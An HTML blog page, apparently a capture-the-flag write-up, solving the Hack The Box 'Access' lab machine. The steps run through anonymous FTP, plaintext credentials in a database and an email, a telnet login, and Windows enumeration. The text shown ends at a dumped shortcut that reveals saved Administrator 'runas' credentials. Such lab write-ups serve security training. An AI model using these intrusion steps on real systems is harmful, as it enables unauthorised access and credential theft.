@@ -1,0 +1,284 @@
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><link href=http://gmpg.org/xfn/11 rel=profile><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Access: Hack The Box writeup &#183; Jamie Magee</title><link rel=stylesheet href=/css/poole.css><link rel=stylesheet href=/css/hyde.css><link rel=stylesheet href=/css/poole-overrides.css><link rel=stylesheet href=/css/hyde-overrides.css><link rel=stylesheet href=/css/hyde-x.css><link rel=stylesheet href=/css/highlight/github.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface"><link rel=stylesheet href=//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css><link rel=stylesheet href=/css/jamie.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/touch-icon-144-precomposed.png><link href=/favicon.ico rel=icon><meta name=description content><meta name=keywords content><meta property="og:title" content="Access: Hack The Box writeup"><meta property="og:description" content="Recently I discovered Hack The Box, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called Access. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!
+Information gathering Let&rsquo;s start with an nmap scan to see what services are running on the box.
+# nmap -n -v -Pn -p- -A --reason -oN nmap."><meta property="og:type" content="article"><meta property="og:url" content="/blog/access-htb-writeup/"><meta property="article:section" content="blog"><meta property="article:published_time" content="2019-03-02T00:00:00+00:00"><meta property="article:modified_time" content="2019-03-02T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Access: Hack The Box writeup"><meta name=twitter:description content="Recently I discovered Hack The Box, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called Access. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!
+Information gathering Let&rsquo;s start with an nmap scan to see what services are running on the box.
+# nmap -n -v -Pn -p- -A --reason -oN nmap."><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-701081-9','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script><script src=https://identity.netlify.com/v1/netlify-identity-widget.js></script></head><body class=theme-base-0c><div class=sidebar><div class="container sidebar-sticky"><div class=sidebar-about><div class=sidebar-head><img src="https://www.gravatar.com/avatar/5a37e2531db08529192d7d323e8cecd8?s=200" alt=gravatar title="Jamie Magee"><h1><a href=/>Jamie Magee</a></h1></div><p class=lead>Programmer, Engineer, Problem Solver</p></div><ul class=sidebar-nav><li class=sidebar-nav-item><a href=/>Home</a></li><li class=sidebar-nav-item><a href=/about>About</a></li><li class=sidebar-nav-item><a href=/blog>Archive</a></li></ul><ul class=sidebar-nav><li class=sidebar-nav-item><a href=https://github.com/JamieMagee><i class="fa fa-github-square fa-3x"></i></a>
+<a href=https://www.linkedin.com/in/jamiemagee1/><i class="fa fa-linkedin-square fa-3x"></i></a>
+<a href=http://twitter.com/Jamie_Magee><i class="fa fa-twitter-square fa-3x"></i></a></li></ul><p>&copy; 2021. <a href=https://creativecommons.org/licenses/by-nc/4.0/>CC BY-NC 4.0</a></p></div></div><div class="content container"><div class=post><h1 class=post-title>Access: Hack The Box writeup</h1><span class=post-date>Mar 2, 2019 &#183; 8 minute read &#183; <a href=/blog/access-htb-writeup/#disqus_thread>Comments</a></span><p><a href=https://www.hackthebox.eu/home/machines/profile/156><img src=/img/access-info.png alt="Access info page"></a></p><p>Recently I discovered <a href=https://www.hackthebox.eu/home>Hack The Box</a>, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called <a href=https://www.hackthebox.eu/home/machines/profile/156>Access</a>. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!</p><h2 id=information-gathering>Information gathering</h2><p>Let&rsquo;s start with an <code>nmap</code> scan to see what services are running on the box.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.98</span>
+...
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed <span style=color:#f92672>(</span>FTP code 230<span style=color:#f92672>)</span>
+|_Can<span style=color:#960050;background-color:#1e0010>&#39;</span>t get directory listing: TIMEOUT
+| ftp-syst:
+|_  SYST: Windows_NT
+23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd <span style=color:#f92672>(</span>no more connections allowed<span style=color:#f92672>)</span>
+80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+</code></pre></div><p><code>nmap</code> has found three services running: FTP, telnet, and an HTTP server. Let&rsquo;s see what&rsquo;s running on the HTTP server.</p><p><img src=/img/htb-access-http.png alt></p><p>It&rsquo;s just a static page, showing an image. Nothing interesting, so let&rsquo;s move on for now.</p><h2 id=anonymous-ftp>Anonymous FTP</h2><p><code>nmap</code> showed that there is an FTP server running, with anonymous login allowed. Let&rsquo;s see what&rsquo;s on that server</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># ftp 10.10.10.98</span>
+Connected to 10.10.10.98.
+<span style=color:#ae81ff>220</span> Microsoft FTP Service
+Name <span style=color:#f92672>(</span>10.10.10.98:root<span style=color:#f92672>)</span>: anonymous
+<span style=color:#ae81ff>331</span> Anonymous access allowed, send identity <span style=color:#f92672>(</span>e-mail name<span style=color:#f92672>)</span> as password.
+Password:
+<span style=color:#ae81ff>230</span> User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+<span style=color:#ae81ff>200</span> PORT command successful.
+<span style=color:#ae81ff>125</span> Data connection already open; Transfer starting.
+08-23-18  08:16PM       &lt;DIR&gt;          Backups
+08-24-18  09:00PM       &lt;DIR&gt;          Engineer
+<span style=color:#ae81ff>226</span> Transfer complete.
+ftp&gt; ls Backups
+<span style=color:#ae81ff>200</span> PORT command successful.
+<span style=color:#ae81ff>125</span> Data connection already open; Transfer starting.
+08-23-18  08:16PM              <span style=color:#ae81ff>5652480</span> backup.mdb
+<span style=color:#ae81ff>226</span> Transfer complete.
+ftp&gt; ls Engineer
+<span style=color:#ae81ff>200</span> PORT command successful.
+<span style=color:#ae81ff>125</span> Data connection already open; Transfer starting.
+08-24-18  12:16AM                <span style=color:#ae81ff>10870</span> Access Control.zip
+<span style=color:#ae81ff>226</span> Transfer complete.
+</code></pre></div><p>There are some interesting files here, let&rsquo;s download them and analyse them</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># wget ftp://anonymous:anonymous@10.10.10.98 --no-passive-ftp --mirror</span>
+--2019-02-02 15:37:26--  ftp://anonymous:*password*@10.10.10.98/
+           <span style=color:#f92672>=</span>&gt; ‘10.10.10.98/.listing’
+Connecting to 10.10.10.98:21... connected.
+Logging in as anonymous ... Logged in!
+...
+FINISHED --2019-02-02 15:37:28--
+Total wall clock time: 1.8s
+Downloaded: <span style=color:#ae81ff>5</span> files, 5.4M in 1.4s <span style=color:#f92672>(</span>3.99 MB/s<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=microsoft-access>Microsoft Access</h2><p>We&rsquo;ve got a <code>.mdb</code> file—which is a Microsoft Access database file—and a zip file. If we take a quick look at the zip file it&rsquo;s password protected. We&rsquo;ll have to come back the that later.</p><p>We can examine <code>backup.mdb</code> using MDB tools. Maybe there&rsquo;s something we can use there.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># mdb-tables Backups/backup.mdb</span>
+acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
+</code></pre></div><p>It looks like there&rsquo;s a lot of autogenerated tables here, but those <code>auth_*</code> tables look interesting.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># mdb-export Backups/backup.mdb auth_user</span>
+id,username,password,Status,last_login,RoleID,Remark
+25,<span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;admin&#34;</span>,1,<span style=color:#e6db74>&#34;08/23/18 21:11:47&#34;</span>,26,
+27,<span style=color:#e6db74>&#34;engineer&#34;</span>,<span style=color:#e6db74>&#34;access4u@security&#34;</span>,1,<span style=color:#e6db74>&#34;08/23/18 21:13:36&#34;</span>,26,
+28,<span style=color:#e6db74>&#34;backup_admin&#34;</span>,<span style=color:#e6db74>&#34;admin&#34;</span>,1,<span style=color:#e6db74>&#34;08/23/18 21:14:02&#34;</span>,26,
+</code></pre></div><p>Awesome! So we&rsquo;ve got some credentials for <code>engineer</code>, and we&rsquo;ve got a password protected zip file in the <code>Engineer</code> directory.</p><h2 id=microsoft-outlook>Microsoft Outlook</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># 7z x Access\ Control.zip</span>
+
+7-Zip <span style=color:#f92672>[</span>64<span style=color:#f92672>]</span> 16.02 : Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span style=color:#f92672>(</span>locale<span style=color:#f92672>=</span>en_GB.UTF-8,Utf16<span style=color:#f92672>=</span>on,HugeFiles<span style=color:#f92672>=</span>on,64 bits,2 CPUs Intel<span style=color:#f92672>(</span>R<span style=color:#f92672>)</span> Core<span style=color:#f92672>(</span>TM<span style=color:#f92672>)</span> i7-7820HQ CPU @ 2.90GHz <span style=color:#f92672>(</span>906E9<span style=color:#f92672>)</span>,ASM,AES-NI<span style=color:#f92672>)</span>
+
+Scanning the drive <span style=color:#66d9ef>for</span> archives:
+<span style=color:#ae81ff>1</span> file, <span style=color:#ae81ff>10870</span> bytes <span style=color:#f92672>(</span><span style=color:#ae81ff>11</span> KiB<span style=color:#f92672>)</span>
+
+Extracting archive: Access Control.zip
+--
+Path <span style=color:#f92672>=</span> Access Control.zip
+Type <span style=color:#f92672>=</span> zip
+Physical Size <span style=color:#f92672>=</span> <span style=color:#ae81ff>10870</span>
+
+
+Enter password <span style=color:#f92672>(</span>will not be echoed<span style=color:#f92672>)</span>:
+Everything is Ok
+
+Size:       <span style=color:#ae81ff>271360</span>
+Compressed: <span style=color:#ae81ff>10870</span>
+
+<span style=color:#75715e># ls</span>
+<span style=color:#e6db74>&#39;Access Control.pst&#39;</span>  <span style=color:#e6db74>&#39;Access Control.zip&#39;</span>
+</code></pre></div><p>That worked! Now we&rsquo;ve got the mailbox backup for the engineer, but we first need to convert it to something that we can read more easily on Linux.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># readpst Access\ Control.pst</span>
+Opening PST file and indexes...
+Processing Folder <span style=color:#e6db74>&#34;Deleted Items&#34;</span>
+	<span style=color:#e6db74>&#34;Access Control&#34;</span> - <span style=color:#ae81ff>2</span> items <span style=color:#66d9ef>done</span>, <span style=color:#ae81ff>0</span> items skipped.
+</code></pre></div><p>Let&rsquo;s take a peek at the engineer&rsquo;s mailbox</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># mail -f Access\ Control.mbox</span>
+mail version v14.9.11.  Type <span style=color:#e6db74>`</span>?<span style=color:#e6db74>&#39; for help
+</span><span style=color:#e6db74>&#39;</span>/root/10.10.10.98/Engineer/Access Control.mbox<span style=color:#e6db74>&#39;: 1 message
+</span><span style=color:#e6db74>▸O  1 john@megacorp.com  2018-08-23 23:44   87/3112  MegaCorp Access Control System &#34;security&#34; account
+</span><span style=color:#e6db74>?
+</span><span style=color:#e6db74>[-- Message  1 -- 87 lines, 3112 bytes --]:
+</span><span style=color:#e6db74>From &#34;john@megacorp.com&#34; Thu Aug 23 23:44:07 2018
+</span><span style=color:#e6db74>From: john@megacorp.com &lt;john@megacorp.com&gt;
+</span><span style=color:#e6db74>Subject: MegaCorp Access Control System &#34;security&#34; account
+</span><span style=color:#e6db74>To: &#39;</span>security@accesscontrolsystems.com<span style=color:#960050;background-color:#1e0010>&#39;</span>
+Date: Thu, <span style=color:#ae81ff>23</span> Aug <span style=color:#ae81ff>2018</span> 23:44:07 +0000
+
+<span style=color:#f92672>[</span>-- <span style=color:#75715e>#1.1 73/2670 multipart/alternative --]</span>
+
+
+
+<span style=color:#f92672>[</span>-- <span style=color:#75715e>#1.1.1 15/211 text/plain, 7bit, utf-8 --]</span>
+
+Hi there,
+
+
+
+The password <span style=color:#66d9ef>for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is pass
+ed on to your engineers.
+
+
+
+Regards,
+
+John
+
+
+
+<span style=color:#f92672>[</span>-- <span style=color:#75715e>#1.1.2 51/2211 text/html, 7bit, us-ascii --]</span>
+?
+</code></pre></div><p>Another set of credentials! I wonder what these are used for? Let&rsquo;s try FTP first</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># ftp 10.10.10.98</span>
+Connected to 10.10.10.98.
+<span style=color:#ae81ff>220</span> Microsoft FTP Service
+Name <span style=color:#f92672>(</span>10.10.10.98:jamie<span style=color:#f92672>)</span>: security
+<span style=color:#ae81ff>331</span> Password required <span style=color:#66d9ef>for</span> security.
+Password:
+<span style=color:#ae81ff>530</span> User cannot log in.
+ftp: Login failed.
+</code></pre></div><p>No dice ☹. The only other option is <code>telnet</code>.</p><h2 id=telnet>Telnet</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># telnet 10.10.10.98</span>
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.
+Welcome to Microsoft Telnet Service
+
+login: security
+password:
+
+*<span style=color:#f92672>===============================================================</span>
+Microsoft Telnet Server.
+*<span style=color:#f92672>===============================================================</span>
+C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\s</span>ecurity&gt;
+</code></pre></div><p>We&rsquo;re in! The <code>user.txt</code> should be located on <code>security</code>&rsquo;s Desktop</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\security&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security
+
+02/02/2019  03<span style=color:#960050;background-color:#1e0010>:</span>56 PM    &lt;DIR&gt;          .
+02/02/2019  03<span style=color:#960050;background-color:#1e0010>:</span>56 PM    &lt;DIR&gt;          ..
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM    &lt;DIR&gt;          .yawcam
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Contacts
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          Desktop
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Documents
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Downloads
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Favorites
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Links
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Music
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Pictures
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Saved Games
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Searches
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>39 PM    &lt;DIR&gt;          Videos
+               1 File(s)        964,179 bytes
+              14 Dir(s)  16,745,127,936 bytes free
+
+C:\Users\security&gt;cd Desktop
+
+C:\Users\security\Desktop&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\Desktop
+
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          .
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          ..
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>37 PM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  16,744,726,528 bytes free
+
+C:\Users\security\Desktop&gt;more user.txt
+&lt;SNIP&gt;
+</code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>Now that we&rsquo;ve got the first flag, we need to escalate to <code>root</code> access—or more specifically <code>Administrator</code> on Windows.</p><p>The <code>.yawcam</code> directory looks out of the ordinary.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>dir .yawcam
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\.yawcam
+
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM    &lt;DIR&gt;          .
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM    &lt;DIR&gt;          ..
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          2
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM                 0 banlist.dat
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          extravars
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM    &lt;DIR&gt;          img
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          logs
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM    &lt;DIR&gt;          motion
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM                 0 pass.dat
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          stream
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          tmp
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>34 PM                82 ver.dat
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          www
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM             1,411 yawcam_settings.xml
+               4 File(s)          1,493 bytes
+              10 Dir(s)  16,764,841,984 bytes free
+</code></pre></div><p>However poking around in there proved fruitless. Maybe there&rsquo;s a way to use this, but I couldn&rsquo;t figure anything out.</p><p>Let&rsquo;s keep looking</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\security&gt;cd ../
+
+C:\Users&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users
+
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>15 PM    &lt;DIR&gt;          .
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>15 PM    &lt;DIR&gt;          ..
+08/23/2018  11<span style=color:#960050;background-color:#1e0010>:</span>46 PM    &lt;DIR&gt;          Administrator
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>15 PM    &lt;DIR&gt;          engineer
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          Public
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>16 PM    &lt;DIR&gt;          security
+               0 File(s)              0 bytes
+               6 Dir(s)  16,754,778,112 bytes free
+</code></pre></div><p>Maybe one of the other users has something interesting we can use?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users&gt;cd engineer
+Access is denied.
+</code></pre></div><p>I didn&rsquo;t really expect that to work anyway</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users&gt;cd Public
+
+C:\Users\Public&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public
+
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          .
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          ..
+07/14/2009  05<span style=color:#960050;background-color:#1e0010>:</span>06 AM    &lt;DIR&gt;          Documents
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Downloads
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Music
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Pictures
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Videos
+               1 File(s)        964,179 bytes
+               7 Dir(s)  16,723,468,288 bytes free
+</code></pre></div><p>Wait a minute, we&rsquo;re missing some of the standard Windows directories. Let&rsquo;s have a closer look.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>
+C:\Users\Public&gt;dir /A
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public
+
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          .
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          ..
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          Desktop
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM               174 desktop.ini
+07/14/2009  05<span style=color:#960050;background-color:#1e0010>:</span>06 AM    &lt;DIR&gt;          Documents
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Downloads
+07/14/2009  02<span style=color:#960050;background-color:#1e0010>:</span>34 AM    &lt;DIR&gt;          Favorites
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Libraries
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Music
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Pictures
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Videos
+               2 File(s)        964,353 bytes
+              10 Dir(s)  16,717,438,976 bytes free
+</code></pre></div><p>Desktop has a much more recent modification date than everything else</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public&gt;cd Desktop
+
+C:\Users\Public\Desktop&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public\Desktop
+
+08/22/2018  09<span style=color:#960050;background-color:#1e0010>:</span>18 PM             1,870 ZKAccess3.5 Security System.lnk
+               1 File(s)          1,870 bytes
+               0 Dir(s)  16,711,475,200 bytes free
+</code></pre></div><p>That&rsquo;s because there&rsquo;s a shortcut there.</p><p>Now, I&rsquo;m not sure of the best way to view a <code>.lnk</code> on <code>cmd.exe</code> via <code>telnet</code>, but this is what I came up with. If anyone knows of a better way, please let me know!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public\Desktop&gt;type <span style=color:#e6db74>&#34;ZKAccess3.5 Security System.lnk&#34;</span>
+L<span style=color:#960050;background-color:#1e0010>�</span>F<span style=color:#960050;background-color:#1e0010>�</span>@ <span style=color:#960050;background-color:#1e0010>��</span>7<span style=color:#960050;background-color:#1e0010>���</span>7<span style=color:#960050;background-color:#1e0010>���</span><span style=color:#75715e>#�P/P�O� �:i�+00�/C:\R1M�:Windows��:��M�:*wWindowsV1MV�System32��:��MV�*�System32X2P�:�</span>
+                                                                                                        runas.exe<span style=color:#960050;background-color:#1e0010>��:</span>1<span style=color:#960050;background-color:#1e0010>��:</span>1<span style=color:#960050;background-color:#1e0010>�</span>*Yrunas.exeL-K<span style=color:#960050;background-color:#1e0010>��</span>E<span style=color:#960050;background-color:#1e0010>�</span>C:\Windows\System32\runas.exe<span style=color:#75715e>#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred &#34;C:\ZKTeco\ZKAccess3.5\Access.exe&#34;&#39;C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�</span>
+                      <span style=color:#960050;background-color:#1e0010>�</span>wN<span style=color:#960050;background-color:#1e0010>���</span>]N<span style=color:#960050;background-color:#1e0010>�</span>D.<span style=color:#960050;background-color:#1e0010>��</span>Q<span style=color:#960050;background-color:#1e0010>���</span>`<span style=color:#960050;background-color:#1e0010>�</span>Xaccess<span style=color:#960050;background-color:#1e0010>�</span>_<span style=color:#960050;background-color:#1e0010>���</span>8{E<span style=color:#960050;background-color:#1e0010>�</span>3
+                                                          O<span style=color:#960050;background-color:#1e0010>�</span>j)<span style=color:#960050;background-color:#1e0010>�</span>H<span style=color:#960050;background-color:#1e0010>���</span>
+                                                                   )ΰ[<span style=color:#960050;background-color:#1e0010>�</span>_<span style=color:#960050;background-color:#1e0010>���</span>8{E<span style=color:#960050;background-color:#1e0010>�</span>3
+                                                                                O<span style=color:#960050;background-color:#1e0010>�</span>j)<span style=color:#960050;background-color:#1e0010>�</span>H<span style=color:#960050;background-color:#1e0010>���</span>
+                                                                                         )ΰ[<span style=color:#960050;background-color:#1e0010>�</span>	<span style=color:#960050;background-color:#1e0010>��</span>1SPS<span style=color:#960050;background-color:#1e0010>�</span>XF<span style=color:#960050;background-color:#1e0010>�</span>L8C<span style=color:#960050;background-color:#1e0010>���</span>&amp;<span style=color:#960050;background-color:#1e0010>�</span>m<span style=color:#960050;background-color:#1e0010>�</span>e*S-1-5-21-953262931-566350628-63446256-500
